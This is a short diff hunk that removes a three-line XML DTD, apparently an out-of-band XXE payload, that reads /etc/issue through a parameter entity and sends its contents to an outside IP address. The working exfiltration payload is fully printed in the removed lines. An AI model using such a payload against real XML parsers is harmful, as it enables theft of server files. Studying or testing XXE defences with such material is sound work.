@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/issue">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://206.189.82.130/key?%file;'>">
-%all;
